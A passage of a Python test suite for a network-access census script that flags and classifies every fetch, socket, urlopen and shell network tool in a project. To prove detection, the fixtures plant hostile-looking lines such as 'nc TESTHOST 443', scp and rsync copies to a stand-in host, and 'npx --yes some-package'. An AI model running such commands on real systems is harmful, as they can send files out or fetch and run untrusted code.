        local_roads = ("local-bus", "local-manager", "local-kernel", "local-program", "local-git")
        tails = [ln.rsplit("-> ", 1)[1] for ln in rows]
        set_aside = sum(1 for t in tails if t.split(" ")[0] in local_roads and "[" not in t)
        self.assertEqual(summary(out)["local_sites"], set_aside, "the local count excludes every classed site")
        self.assertEqual(summary(out)["external"], sum(1 for t in tails if t.endswith("[external-program]")))
        self.assertEqual(summary(out)["runtime"], sum(1 for t in tails if t.endswith("[runtime-program]")))


class TheBrowserFetchIsClassifiedByItsUrl(_Scope):
    """A fetch under ui/ is local only by its argument: a relative literal or a kernel-URL helper. An absolute literal needs
    a row; a computed argument is the named class, whose committed count moves."""

    def test_an_absolute_literal_needs_a_row_a_helper_is_local_and_a_variable_is_the_class(self):
        n = len(self.lines(self.append("ui/webview/strip.ts", '\nexport function probeFetches(u: string): void {\n  void fetch("https://TESTHOST/x");\n'
                                       '  void fetch(kernelUrl("/probe"));\n  void fetch("/probe");\n  void fetch(u);\n}\n')))
        absolute, helper, relative, computed = n - 4, n - 3, n - 2, n - 1
        rc, out, _ = inventory(scope_copy())
        self.assertRefused(rc, out, "UNCLASSIFIED")
        named = unclassified(out)
        self.assertIn("ui/webview/strip.ts:%d" % absolute, named, "a literal to another host is a road and needs a row")
        for line in (helper, relative, computed):
            self.assertNotIn("ui/webview/strip.ts:%d" % line, named)
        self.assertListed(out, r"ui/webview/strip\.ts:%d  fetch  fetch\(kernelUrl\(\"/probe\"\)\)  in -  -> local-kernel" % helper)
        self.assertListed(out, r"ui/webview/strip\.ts:%d  fetch  fetch\(\"/probe\"\)  in -  -> local-kernel" % relative)
        self.assertListed(out, r"ui/webview/strip\.ts:%d  fetch  fetch\(u\)  in -  -> \(browser-computed-url\)" % computed)
        expected = _expected()
        self.assertRefused(rc, out, "COUNTS classes browser-computed-url: the committed count is %d, this run found %d"
                           % (expected["classes"]["browser-computed-url"], expected["classes"]["browser-computed-url"] + 1),
                           "COUNTS per_key ui/webview/strip.ts:fetch: the committed count is %d, this run found %d"   # the four new lines share the key
                           % (expected["per_key"]["ui/webview/strip.ts:fetch"], expected["per_key"]["ui/webview/strip.ts:fetch"] + 4))

    def test_the_copy_image_handler_reads_a_computed_url_and_is_not_a_browser_figures_site(self):
        """extra8-4 by execution: the lightbox's re-fetch reads the shown img's src (the kernel's own file URL by its binding),
        so it sits in the computed-URL class, not on the browser-figures road and not local by path."""
        rc, out, _ = tree_run()
        self.assertEqual(rc, 0, "the run must exit 0:\n" + gates(out))
        self.assertListed(out, r"ui/webview/preview\.ts:\d+  fetch  fetch\(src\)  in -  -> \(browser-computed-url\)")
        figures = [ln for ln in out.splitlines() if ln.endswith("-> browser-figures")]
        self.assertEqual(sorted(ln.split("  ")[1] for ln in figures), ["Image", "figureHosts"], figures)


SOCKETS_TEXT = ('\nimport asyncio, socket\n\ndef _probe_sock(addr):\n    s = socket.socket()\n    s.connect(addr)\n\n'
                'async def _probe_aio():\n    return await asyncio.open_connection("TESTHOST", 443)\n')


class ThePrimitiveListIsKeptHonest(_SharedRun):
    """NET is a closed list, so the import side is the gate: a module the census does not know fails the run; and the
    primitives the round named beyond the list (a bound socket's connect, asyncio's connections) are sites. The unknown
    import and the socket block are appended to kernel/credentials.py in the shared walk run (the fifth round; a run each
    before), the one shared run whose members hold no property over the run's IMPORT set (the credentials run's import-gate
    case holds that run's set equal to its own lines); each property here is a line of its own block. The known-import case
    asserts the whole run's IMPORT lines empty and keeps a run of its own."""

    RUN = "walk"

    @classmethod
    def mutate(cls, cleanup):
        cls.at["httpx"] = len(_lines(_append("kernel/credentials.py", "\nimport httpx\n", cleanup)))
        cls.at["sockets"] = len(_lines(_append("kernel/credentials.py", SOCKETS_TEXT, cleanup)))

    def test_an_unknown_import_is_the_loud_line(self):
        self.assertRefused(self.rc, self.out, "IMPORT kernel/credentials.py:%d imports httpx" % self.at["httpx"])

    def test_a_known_import_is_not(self):
        self.append("kernel/credentials.py", "\nimport json as _probe_json\n")
        rc, out, _ = inventory(scope_copy())
        self.assertFalse([ln for ln in out.splitlines() if ln.startswith("IMPORT")], gates(out))

    def test_a_bound_sockets_connect_and_an_asyncio_connection_are_sites(self):
        n, out = self.at["sockets"], self.out
        self.assertRefused(self.rc, out, "UNCLASSIFIED")
        named = unclassified(out)
        self.assertIn("kernel/credentials.py:%d" % (n - 3), named, "s.connect(addr) on a socket bound in the function")
        self.assertIn("kernel/credentials.py:%d" % n, named, "asyncio.open_connection")


WARM_TEXT = "\n\ndef _warm_prices():\n    import urllib.request\n    return urllib.request.urlopen(%r, timeout=4)\n" % FEED_LITERAL


class ASecondSiteInsideARowedFunctionIsRed(_SharedRun):
    """The table is keyed on file and function; the committed count per key is the guard for a second site inside a rowed
    function, a stale row is its own gate, and the table's road list is held equal to the rows' roads. The literal-URL
    function is appended to kernel/kernel.py in the shared walk run (the fifth round), its line recorded as it lands and its
    property that line's; the other three cases assert a figure of the whole run (an empty UNCLASSIFIED set) or mutate the
    script and keep runs of their own."""

    RUN = "walk"

    @classmethod
    def mutate(cls, cleanup):
        cls.at["warm"] = len(_lines(_append("kernel/kernel.py", WARM_TEXT, cleanup)))

    def test_a_second_urlopen_inside_the_workers_function_is_named_by_its_key(self):
        anchor = "                with urllib.request.urlopen(PRICE_FEED_URL, timeout=4) as r:\n"
        self.replace("kernel/kernel.py", anchor, "                urllib.request.urlopen(%r, timeout=4)\n" % FEED_LITERAL + anchor)
        rc, out, _ = inventory(scope_copy())
        self.assertRefused(rc, out, "COUNTS per_key kernel/kernel.py:_refresh_remote_prices.work: the committed count is 1, this run found 2")
        self.assertFalse(unclassified(out), "the second site takes the row; the count is what names it: %r" % unclassified(out))
        self.assertEqual(len(re.findall(r"kernel/kernel\.py:\d+  urlopen  .*  in _refresh_remote_prices\.work  -> price-feed", out)), 2,
                         "both sites are listed, so the new line is readable")

    def test_a_fetch_of_the_feeds_url_spelled_as_a_literal_in_a_new_function_is_unclassified(self):
        """correctness-3: the module's first half keys on the NAME PRICE_FEED_URL; this run keys on the primitive."""
        self.assertRefused(self.rc, self.out, "UNCLASSIFIED")
        self.assertIn("kernel/kernel.py:%d" % self.at["warm"], unclassified(self.out))

    def test_a_row_naming_no_site_is_stale(self):
        self.replace(INVENTORY, '_t("price-feed", K + "_refresh_remote_prices.work")', '_t("price-feed", K + "_refresh_remote_prices.work", K + "_no_such_function")')
        rc, out, _ = inventory(scope_copy())
        self.assertRefused(rc, out, "STALE ROW kernel/kernel.py:_no_such_function names no site")

    def test_the_tables_roads_and_the_rows_roads_are_one_set(self):
        self.replace(INVENTORY, '("price-feed", "price feed (kernel-request)",', '("price-feed-x", "price feed (kernel-request)",')
        rc, out, _ = inventory(scope_copy())
        self.assertRefused(rc, out, "TABLE the road price-feed has sites and no ROADS entry", "TABLE ROADS names price-feed-x, a road with no site")


# The two sentences the docstring, the --table output and SECURITY.md's Network access section share: held here
# by execution beside the planted call the scan does not see, so neither can outlive the behaviour.
RESIDUAL = ("a socket primitive called on a receiver the census cannot resolve (an attribute-held or parameter socket) is not a "
            "site here")
DISCLOSURE = ("The shell and browser sides are matched by a named list with no completeness gate: a tool or a client the lists "
              "do not name is no site and no line; the Python side's gate is module-granular: an import outside the allow-list "
              "fails the run, and a primitive of a known module outside NET and SUB is not a site.")
UNSEEN_LABEL = "a socket primitive on a receiver this scan cannot resolve (not derivable by this scan)"
# The fourth round's sentences (2026-09-23), one text each with the script's docstring (and, for the first two, SECURITY.md's
# Network access section, which tests/test_security_price_feed.py holds to the same constants): the echo rule beside the
# disclosure sentence (correctness-1 and regression-2), the served pages (fresh-1), and the served scan's own statements: the
# refused whole-file text scan, the narrowed import gate, the keyed-by-tool residual, and the named class it does not count.
ECHO_RULE = ("An echo- or print-led shell line is skipped as a printed remedy only when nothing live follows the printed text: the text "
             "outside quotes and the body of every `$(...)` and backtick substitution, wherever it stands, are scanned by the interpreter arm "
             "and the tool list, so `echo \"$body\" | curl ...` and `echo \"rate: $(curl ...)\"` are sites and a remedy that names a tool "
             "inside quotes is not.")
SERVED_PAGES = ("The pages the kernel serves and its service worker's script, from its own string constants (the dashboard shell, the seven pane "
                "pages, the token login page, the too-large page and /sw.js, with the shim, the timeline boot and the shell scripts they inline),"
                " are read from kernel.py's syntax tree and scanned as browser text keyed kernel/kernel.py plus tool, with the DOM loads counted."
                " The routes are derived from the calls of `_send` the scan reads (spelled `_send(...)` or `<x>._send(...)`; a call through a "
                "name computed at run time is not read) and every Content-Type header written outside `_send`, in every scanned Python file. A "
                "`_send` call's content type is read through the definition it reaches, the one def or async def statement that binds `_send` in "
                "its file, direct in the call's own class body (a call through self) or in the module (a bare call): the kernel's Handler._send "
                "writes its `ctype` parameter, so the call's third argument or its `ctype=` keyword; the postal bus's writes application/json; "
                "the session host's and its transport's write a frame to a Unix socket and answer no HTTP request (FRAME_WRITERS), and any other "
                "definition that writes no Content-Type fails the run. So does each `_send` call in a file that binds `_send` more than once "
                "outside function bodies (the module and every class body counted together, a class body a function body defines included, since "
                "a class body is no function body, in any binding form but a comprehension's target, which binds only in its comprehension) or "
                "other than by one def statement direct in a class body or the module, or where a function or a class body binds it under a "
                "`global` declaration, rebinding the module's name at run time, each bare call that reaches a `_send` bound inside a function, a "
                "lambda, a comprehension or a class body around it, in any form "
                "(a parameter, a nested def, a loop target, a lambda's parameter and a comprehension's target among them; the line names the scope "
                "and the binding), each call that reaches no definition the census reads, the line saying why (a `_send` the call's own class "
                "body does not bind, for a call through self: inherited or set at run time; one reached through an object other than self, or "
                "through an attribute outside any class body; a `_send` no scope the bare call looks it up in binds, the module included; and, "
                "in a file that names `_send` "
                "nowhere but as the called name of those calls, so binds it nowhere at all, a definition the file does not hold), each call to a "
                "definition carrying any decorator, whose parameters the census does not read, and each bare call in a module that holds a star "
                "import. An override of `_send` in a subclass that another file defines is not read: a call through self is typed through its "
                "own class body's definition. The type is read "
                "through a module name no code writes after binding it (one plain single-name assignment binds it as a top-level statement, "
                "nothing else at module level binds "
                "it, a walrus in a def's or a class's header included, the module holds no star import, and nothing in the file writes that name,"
                " in any scope: a subscript store or delete, a call `<name>.<method>(` of a method _MUTATORS or _DUNDER_MUTATORS lists, a call of"
                " such a method on a type _CONTAINER_TYPES lists with the name as its first argument (`dict.update(<name>, ...)`), a binding in a"
                " function that declares the name `global` (as the target of an assignment, an augmented assignment, a loop, a comprehension, a "
                "with or a walrus, or by an import, a def or class statement or an except clause) or a module-level augmented assignment), "
                "through a local whose every binding is read (a walrus in a nested def's, class's or lambda's header is a binding it does not "
                "read) and through a dict literal's values; the part before any `;`, stripped and lower-cased, is compared with the types a "
                "browser runs script from (SCRIPT_TYPES: text/html; the XML types text/xml, application/xml, text/xsl and any type with a `+xml` "
                "suffix, image/svg+xml and application/xhtml+xml among them; and text/javascript under each name a browser takes for JavaScript, "
                "application/javascript among them). A script-running route's page body is the call's second positional argument, read only when "
                "the call passes it positionally, with no starred argument before it and no `**`, and the definition's one output is its one "
                "`<x>.write(<its second positional parameter>)`, nothing in a method's definition binding self again, in any form (a lambda's "
                "or a nested def's parameter among them), or declaring it global, every call in the definition being one the census reads: "
                "that write; "
                "send_response, send_header or end_headers on self; getattr of self with a string-constant name; isinstance, str or len, where "
                "neither the definition nor the module binds the name and the module holds no star import; or a method called on a parameter or "
                "on a value built from parameters and literals (`body.encode`, `(headers or {}).items()`), self and the name the write's stream "
                "hangs from never counting as a parameter here, and a parameter the definition rebinds counting only while every rebinding is "
                "such a value. Any other script-running call fails the run by name, its reason naming the road (a second write, a write through "
                "an alias, a print to a stream and a call the reader does not read among the reasons), among them a keyword body, a starred or "
                "`**` call, a definition"
                " whose one write is of another parameter, a local or an expression, or that writes nothing, and in the definition any other "
                "call, any other read of an attribute named `write`, `writelines`, `send`, `sendall`, `sendfile` or `sendmsg`, called or not, a "
                "string constant equal to one of those names and a reference to the write's receiver other than as its receiver. A stream the "
                "definition reaches through no name it spells (a module global holding the socket, written by a method the definition calls on "
                "self) is not read. The page function of each script-running route is followed to the text it returns or inlines, and a "
                "parameter a followed call omits is read from its default value as that argument would be, in the scope the def statement runs "
                "in (a default the pass cannot read is refused by name, among them a method's default naming a name its class body binds). A "
                "name the page"
                " function's scope binds, or for a function defined in it an enclosing function's scope, is decided by that scope and never by "
                "the module's binding: a local (a parameter the body also assigns, a walrus in a nested def's, class's or lambda's header, and a "
                "comprehension's target inside its comprehension among them) is read from its values as a bare name or a receiver and refused as "
                "a callee; a parameter or an except name is a value slot, refused as a callee when it shares a module function's name; a function"
                " defined in the page function is followed as a callee only as its name's one binding there; a name the function declares "
                "`global` is the module's binding, read as such; and any other binding refuses, a comprehension's target elsewhere in the "
                "function, a function-level import, a nested class, a del, a name a nonlocal declaration rebinds and a name bound two ways (two "
                "different binding forms in one scope, or a def or a class statement beside any other binding of it; every value form, an "
                "assignment, augmented or annotated, a loop, with or unpacking target and a walrus, is one form, and a parameter the body also "
                "binds by one is one local, read from its values) among them. In that text the served pass"
                " reads a BoolOp's operands, a method call's receiver and a subscript's container when they name a module constant (a name one "
                "plain single-name assignment binds as a top-level statement and nothing else binds at module level, in a module with no star "
                "import) or a local, the receiver of "
                "`.encode` or `.format_map` whatever it is, a class attribute the class body binds, a loop, unpacking or with target from its "
                "source, and a local container's appended or stored values; it passes over a base that carries no page text of its own (in a "
                "module that holds no star import, a top-level import statement that is its name's one module-level binding and is not rebound, "
                "or a builtin that no module-level binding shadows and that is not rebound, a call of super() excepted, whose methods are a base "
                "class's; a parameter, an except name, or a name the function binds from one of those), reading as text the arguments of a call "
                "of such a base or of a method on one (`dict(X).get(k)` and "
                "`json.loads(json.dumps(X))[0]` read X), and over a bare module name that is such an import or such a builtin, or, in such a "
                "module, a top-level def or class"
                " statement that is its name's one module-level binding and is not rebound; a name is rebound when a function binds it under "
                "`global` or a statement at module level writes it, in one of the forms listed above for a route's type, and by nothing else: a "
                "function's `X = []` of a local of the same name, or its `X.append(...)`, does not rebind it. It follows a call whose callee is a"
                " module function (a top-level def statement that is its name's one module-level binding, not rebound, in a module with no star "
                "import, and bound by no function scope of the page), a function defined in the page function or a method of the route's class "
                "(to what it returns, any decorator on it not applied), a text method or a file read, or any other method (through its receiver, "
                "as above, so `_K.__call__(t)` on a module constant `_K` that holds a lambda reads `_K`, and a lambda is a value slot with no "
                "text), and it reads every call's arguments; a call to any other callee passes when the callee is such an import, such a builtin "
                "or a parameter. The run fails by name (SERVED) on any other reference to `_send` (a read of it that is not a call's function, a "
                "store or delete of an attribute so named, or a string equal to `_send`), a content type the pass cannot read, a script-running "
                "type written outside `_send`, a function that"
                " answers outside `_send` more often than it writes a Content-Type header, a container the module writes at run time, any other "
                "receiver or container, any other callee (a module constant, a local, a class, a subscript, a call and a lambda among them), any "
                "other bare module name (one bound other than by one assignment, one bound by an annotated, unpacking or chained assignment, one "
                "no module-level statement binds that a function or a class body binds under a `global` declaration, an "
                "import, a function or a class beside another module-level "
                "binding, an import, a def or a class bound once inside a module-level block and not by a top-level statement, a name bound once "
                "in any other form inside such a block's body, a name a star import may rebind, and a rebound import, builtin, function or class "
                "among them), and a route whose text the pass cannot read, "
                "unless the served allowlist, SERVED_ALLOW, names the place by its function and expression, with the number of places the entry "
                "covers and the reason (the two answers with no body, the CORS preflight's 204 and the websocket upgrade's 101, are named there);"
                " an entry that names nothing in the run, or covers a different number of places, fails the run too. In served text every "
                "`fetch(` and `import(` on a line is read by its own argument, and no comment skip applies, since a joined constant is one line "
                "whatever it starts with. A file the page reads at run time is covered by the walk when it is a scanned kind, and a stylesheet is"
                " named, not scanned.")
SERVED_REFUSED_SCAN = ("The whole of kernel.py is not scanned as text, since a text scan misreads Python and JS concatenations (a Python "
                       "method spelled like a client, a `from` inside a script split across Python literals).")
SERVED_IMPORT_GATE = ("Over served text the import gate's statement form applies to a line that starts with import or export, "
                      "and to a line led by `from` or a closing brace only where it continues an import or export statement that begins "
                      "its own line and has not yet ended (a line led by a closing brace is a multi-line import's last line in a module "
                      "and any block's in a page's script), while a literal require() or import() spelled whole on one line (the name, its "
                      "paren, the quoted specifier and the closing paren, with nothing between them but whitespace inside the parens) is "
                      "gated "
                      "wherever it stands.")
SERVED_KEYED_RESIDUAL = ("The served pages' rows are keyed by tool (kernel/kernel.py plus WebSocket, window.open or clients.openWindow) and counted "
                         "once per line; only fetch and import() are read per match. A second socket or opener in the served text is therefore "
                         "caught by the count per key when it changes the tool or stands on a line without its tool, and not when it joins a line "
                         "or a joined constant that already carries its tool, as any rowed shell or JavaScript line is (the residual above).")
SERVED_NAMED_CLASS = ("Named and not counted in the served text: a stylesheet's `url()` loads (THEME_CSS's fonts, _LOADER_CSS's face, "
                      "_RDRIFT_CSS's and the dashboard shell's own rules, and the pane stylesheets under ui/webview read at run time), every one "
                      "a `/media` path on the kernel's own origin, and the same-origin navigations no list names (`location.replace` on the token "
                      "login page, `location.reload` in the shim and the shell, `navigator.serviceWorker.register('/sw.js')`, "
                      "`history.replaceState`).")
ROUND_FOUR_SENTENCES = (("the echo rule", ECHO_RULE), ("the served pages", SERVED_PAGES), ("the refused whole-file text scan", SERVED_REFUSED_SCAN),
                        ("the narrowed import gate over served text", SERVED_IMPORT_GATE), ("the keyed-by-tool residual of the served rows", SERVED_KEYED_RESIDUAL),
                        ("the named class the served scan does not count", SERVED_NAMED_CLASS))
# The fifth round's sentences (2026-09-23), one text each with the script's docstring: the served scan's line-keying residual
# (correctness-4), the two roads named in the table and not counted (extra6-1, the paint references of the chat's file preview
# and a notice card; extra6-2, an .svg opened in its own tab), and the binding shapes no pattern reads (correctness-3), which
# the sixth round's review rewrote as UNREAD_BINDINGS below (correctness-4, extra6-1, extra7-2 and extra6-3: the two JavaScript
# refusals, JS_ALLOW, and the population a binding the patterns read still leaves unread; one text with SECURITY.md's, which
# tests/test_security_price_feed.py holds, and with the ledger entry's census paragraph, which TheJavaScriptSideRefusesWhatItCannotRead
# holds; TheAddedBindingShapesAreRead and TheJavaScriptSideRefusesWhatItCannotRead execute it); SERVED_PAGES above is the fifth
# round's rewrite of the fourth round's sentence (F, G and H), restated by the seventh round (A: the shapes each Python reader
# reads, every other shape refused by name, and the two limits), one text with SECURITY.md's (tests/test_security_price_feed.py
# holds that home); PAINT_ROAD_SENTENCE's last clause, what the caller census reds, is the sixth round's (tests-3), one text with that
# census's messages, which tests/test_security_price_feed.py holds in the script's docstring and the paint row's where cell
SERVED_LINE_RESIDUAL = ("A site in served text is listed at the first line of the string part that carries it. Text joined across implicitly "
                        "concatenated literals is one part, listed at its first line. On Python 3.10 and 3.11 an f-string part is listed at the "
                        "line where the expression before it ends, so a part that starts on a later line (after a `}` on a line of its own, or in "
                        "the next literal of a concatenation) is listed early. The count is the same on every interpreter.")
PAINT_ROAD_SENTENCE = ("One road is named in the table and not counted, since its loads are rendered-markdown insertions with no attribute line: "
                       "the chat's file preview (render.ts previewMdClean) and a notice card's body (feed.ts noticeBodyNodes) render markdown "
                       "through the shared sanitizer and then stripRemoteLoads (ui/webview/file-preview.ts), which reads no paint attribute, so an "
                       "inline svg's paint references load from the hosts they name; tests/test_security_price_feed.py counts by grep "
                       "every call in render.ts spelled `md(` or `userMd(`, a gap before the paren allowed, on one line (`md (t)` and "
                       "`x.md(t)` among them), and every reference to "
                       "stripRemoteLoads (a call, an import, an alias) in the .ts and .js files directly under ui/webview and "
                       "vscode-extension/src, skipping test files, each name's definition (`function md(` and the like), a line that "
                       "opens with `//`, `*` or `/*`, and the text from a `//` that starts the line or follows whitespace; each match "
                       "is counted under the nearest `function NAME(` line at or above it, so a new call or reference moves a count and "
                       "is red: under its caller's name when that line declares the caller, and otherwise under the function that line "
                       "declares, or under none above the first such line.")
SVG_TAB_ROAD_SENTENCE = ("A second road is named in the table and not counted, since its loads are the opened document's own and have no line in "
                         "this tree: a Cmd, Ctrl or middle click on a path link to an .svg opens the kernel's /file URL, or its /remote/<host>/file "
                         "relay, in the browser's own tab through preview.ts's openFileTab, a site counted on the local-kernel road by the URL it "
                         "opens, and that tab is an svg document that loads what its markup names; tests/test_security_price_feed.py holds the "
                         "road's population to the property that image/svg+xml is the one document type /file serves a file's bytes under, so a "
                         "second document type there is red.")
UNREAD_BINDINGS = ("Two refusals cover what the JavaScript binding patterns and the import gate do not read, each an IMPORT line unless "
                   "the JavaScript allowlist, JS_ALLOW, names the place by its file and expression, with the number of places the entry "
                   "covers and the reason; an entry that names nothing in the run, or covers a different number of places, fails the run "
                   "too. First, a literal specifier of a family module (`http`, `https`, `net`, `tls`, `ws` or `child_process`) that the "
                   "import gate reads is read only where a binding the patterns read takes the module from it, whole or by names, or an "
                   "arm reads a call through it (`require('http').request(`); a require or an `await import()` taken whole does not count "
                   "when `.`, `?`, `[` or `(` follows it past whitespace and comments, and a brace list that takes `default` does not "
                   "count unless the same statement binds that name whole (`import { default as X }`), so a require in a later declarator, "
                   "`require(\"http\").get` read as a value, a destructured default, a require assigned after its declaration, a `.then()` "
                   "callback of `import()` and a re-export are each refused; and in a walked file a binding the patterns match whose specifier "
                   "stands on a line led by `//`, `/*` or `*`, where the gate reads no module, is refused as a binding on a line led by `//`, "
                   "`/*` or `*`, whose module the gate does not read; the webview leg's pin sees such a binding when the line is code (a "
                   "`*`-led continuation of an import) and none on a comment line or in a template literal's text. Second, on a "
                   "walked line the scan reads (not in served text), "
                   "a require or import the gate cannot read is refused: a call of `require` in any other shape (whitespace or a comment "
                   "before the paren, a template or a computed specifier), `require` as a bare value (followed by `;`, `,`, `)`, `}`, `]` "
                   "or the end of the line, outside a string and a comment, where a quote opens a string to the same quote's "
                   "next occurrence on the line that no backslash escapes, `/*` outside a string opens a comment to the next "
                   "`*/` on the line or the line's end, and `//` outside a string opens a comment to the line's end), any "
                   "`.require(` call, any member access on `require`, a `createRequire(` call, and an `import(` with a template "
                   "specifier or with whitespace or a comment before its paren. So every literal specifier of a family module "
                   "that the gate reads is read or refused, and on a walked line every require the gate cannot read is refused "
                   "when it is spelled in one of those shapes; one spelled another way (a "
                   "computed member such as `module[\"require\"]`, `require` beside an operator, a createRequire under another name) is no "
                   "site and no line. A client is read through a call on the module or on a binding the patterns read: a dotted call on an "
                   "inline require or on a name the file keeps the module under, or a call of a bare name the file binds from it, each read "
                   "only as spelled on one line with nothing between the require or the name, the dot, the method and the paren "
                   "(`http.get(`), or between the bare name and the paren (`get(`), and `ws` by its constructor shape, read with whitespace "
                   "before its paren too (`new WS (u)`, `new W.WebSocket (u)`). A client reached from such a binding any other way is no site "
                   "and no line, among them a member alias (`const g = http.get`), a "
                   "destructure from the binding (`const { get } = http`), a computed member, `.call`, an optional chain, a call spelled "
                   "with whitespace or a comment around the dot or before the paren (`http . get(`, `http.get (`, `get (`) and a call "
                   "split across lines before its paren (`http` at the end of one line and `.get(` at the start of the next); an inline "
                   "require called either of the last two ways is refused by the first refusal. The import "
                   "gate reads a specifier in a literal require() or import() spelled whole on one line (the name, its paren, the quoted "
                   "specifier and the closing paren, with nothing between them but whitespace inside the parens), wherever it stands, in "
                   "a side-effect import that begins its line (`import`, whitespace alone, then the quoted specifier), and in the first "
                   "`from` string (`from`, whitespace alone, then a quoted specifier) on a line that starts with import or export or that "
                   "continues an import or export statement that begins its own line and has not yet ended, and, in a walked file, any line led "
                   "by a closing brace. In a walked file such a statement opens at `import` (not `import(` or `import.meta`), `export {`, "
                   "`export *`, `export type {` or `export type "
                   "*` and ends at the line where the gate reads its `from` string or at a line that ends with `;` outside a string and a "
                   "comment; any line of it is read whatever leads it but a line led by `//`, `/*` or `*`, which is skipped, a binding on one "
                   "refused by the first refusal. Over the walked files the webview leg's pin (ui/webview/import-gate-parse.test.ts) holds these reads "
                   "equal to a TypeScript parse of the same files (the specifier of each import and export declaration, of `import X = "
                   "require()`, of a require or import() call on a quoted literal and of an import type), both ways, keyed on file, line "
                   "and specifier, and holds each require or import() call whose first argument is not a quoted literal to a line where "
                   "the second refusal fires (an import() on a computed argument that is not a template, to a browser-computed-url "
                   "site), so a specifier in a layout the line reader does not read is red there by file, line and specifier. Served "
                   "text is not parsed, and the pin does not hold "
                   "it: there such a statement opens at any line that starts with import or export (not `import(` or `import.meta`), a "
                   "line continues it only when led "
                   "by `from` or a closing brace, and no line is skipped as a comment. Through a binding whose specifier the gate reads, "
                   "`https`, `net` and `tls` still fail the run at the gate, so this residual reaches `http`, `ws` and `child_process`, "
                   "the packages the list knows; in served text, through a binding the patterns read from a specifier the gate does not "
                   "read, among them one on the line after a trailing `from`, one on a continuation line led by anything but `from` or a "
                   "closing brace, one in a require() or `await import()` split across lines and one in a statement that does not begin "
                   "its line, it reaches `https`, `net` and `tls` as well. A comment between `from` (or a side-effect `import`) and its "
                   "specifier is read by neither the gate nor the binding patterns, so in served text a client through it is no site and "
                   "no line whatever the module, `https`, `net` and `tls` included, and a package outside KNOWN_JS_IMPORTS passes the "
                   "gate. The first refusal also refuses a "
                   "line that binds nothing to call, such as `import type http from \"http\"` or `let a: typeof import(\"http\")`; no such "
                   "line is live.")
ROUND_FIVE_SENTENCES = (("the served scan's line-keying residual", SERVED_LINE_RESIDUAL), ("the paint road named and not counted", PAINT_ROAD_SENTENCE),
                        ("the .svg tab road named and not counted", SVG_TAB_ROAD_SENTENCE),
                        ("the two JavaScript refusals and what a read binding leaves unread", UNREAD_BINDINGS))


def _inventory_docstring():
    """The script's module docstring with its line wraps folded to single spaces, so a sentence is matched whole."""
    with open(os.path.join(ROOT, INVENTORY), encoding="utf-8") as f:
        return " ".join((ast.get_docstring(ast.parse(f.read())) or "").split())


def _listed(out, prefix):
    """The site lines of one file in the run's listing."""
    return [ln for ln in out.splitlines() if ln.startswith(prefix) and SITE_LINE.match(ln)]


SERVICE_TEXT = "_probe_fetch() {\n    python3 -c 'import urllib.request, sys; urllib.request.urlopen(sys.argv[1]).read()' %r\n}\n" % FEED_LITERAL
WAKE_TEXT = ("python3 - \"$1\" <<'PY'\nimport sys\nprint(sys.argv[1])\nPY\n"
             "node -e 'fetch(%r)'\n"
             "rsync -a \"$d\" TESTHOST:/srv/x\n"
             "scp \"$f\" TESTHOST:/srv/x\n"
             "sftp TESTHOST\n"
             "nc TESTHOST 443\n"
             "npx --yes some-package\n"
             "[ -e \"$f\" ] && grep -c romp \"$f\"\n"
             "\"$PY\" -c pass\n" % FEED_LITERAL)
WAKE_STARTS = (("heredoc", "python3 - "), ("node", "node -e"), ("rsync", "rsync "), ("scp", "scp "), ("sftp", "sftp "), ("nc", "nc "),
               ("npx", "npx "), ("flags", "[ -e"), ("variable", '"$PY" -c'))
NPX_LINE, NPX_GONE = "npx --yes @vscode/vsce package", "# the package step removed in this copy: vsce package"


class TheShellSideHasAnInterpreterArm(_SharedRun):
    """An interpreter head (python, python3, node, perl, sh, bash) followed by -c or -e, or by a bare `-` (the heredoc
    shape), is a site keyed file plus tool in the external-program class, and needs a row like every member; npx, scp,
    rsync, sftp and nc are tools. Before the round's fix a urllib call inside `python3 -c` in a shell script was no site
    and exit 0 (correctness-1, extra6-1 of the third round). The shared run carries three files: the row-less python3 -c
    text in bin/romp-service, the nine lines in hooks/romp-wake.sh and vscode-extension/install.sh with its npx line
    removed; the rowed text's case reads the whole run's class count and runs alone."""

    RUN = "shell"

    @classmethod
    def mutate(cls, cleanup):
        # bin/romp-service has rows for its curl and its heredoc; a python3 -c text is a new tool and so a new key
        cls.at["service"] = len(_lines(_append("bin/romp-service", SERVICE_TEXT, cleanup))) - 1
        # hooks/romp-wake.sh has a curl row and nothing else: every new tool below is a new key with no row
        lines = _lines(_append("hooks/romp-wake.sh", WAKE_TEXT, cleanup))
        cls.at.update({name: next(i + 1 for i, ln in enumerate(lines) if ln.startswith(start)) for name, start in WAKE_STARTS})
        _replace("vscode-extension/install.sh", NPX_LINE, NPX_GONE, cleanup)

    def test_an_inline_interpreter_text_in_a_rowed_shell_file_needs_its_own_row_and_carries_the_class(self):
        n, out = self.at["service"], self.out
        self.assertRefused(self.rc, out, "UNCLASSIFIED")
        self.assertIn("bin/romp-service:%d" % n, unclassified(out), "the python3 -c text is a site with no row")
        self.assertListed(out, r"bin/romp-service:%d  python3 -c  .*  in -  -> UNCLASSIFIED \[external-program\]" % n,
                          "the site is keyed on the interpreter and its flag and classed, so the class count moves with it")

    def test_the_same_text_with_a_row_is_listed_on_its_road_with_the_class(self):
        n = len(self.lines(self.append("bin/romp-service", SERVICE_TEXT))) - 1
        self.replace(INVENTORY, "LOCAL_ROADS = {", '_t("local-program", "bin/romp-service:python3 -c")\nLOCAL_ROADS = {')   # a row planted before the road sets
        rc, out, _ = inventory(scope_copy())   # a run of its own: the empty UNCLASSIFIED set and the class count are the whole run's
        self.assertFalse(unclassified(out), "the row places the site: %r" % unclassified(out))
        self.assertListed(out, r"bin/romp-service:%d  python3 -c  .*  in -  -> local-program \[external-program\]" % n,
                          "a rowed interpreter site keeps its class whatever road the row names")
        expected = _expected()
        self.assertRefused(rc, out, "COUNTS per_key bin/romp-service:python3 -c: the committed count is None, this run found 1",
                           "COUNTS classes external-program: the committed count is %d, this run found %d"
                           % (expected["classes"]["external-program"], expected["classes"]["external-program"] + 1))

    def test_the_heredoc_shape_node_e_and_the_five_tools_are_sites_and_a_variable_head_and_a_bare_flag_are_not(self):
        at, out = self.at, self.out
        self.assertRefused(self.rc, out, "UNCLASSIFIED")
        named = unclassified(out)
        for name in ("heredoc", "node", "rsync", "scp", "sftp", "nc", "npx"):
            self.assertIn("hooks/romp-wake.sh:%d" % at[name], named, "%s is a site with no row" % name)
        self.assertListed(out, r"hooks/romp-wake\.sh:%d  python3 -  .*  -> UNCLASSIFIED \[external-program\]" % at["heredoc"], "the heredoc shape: the head with a bare - argument")
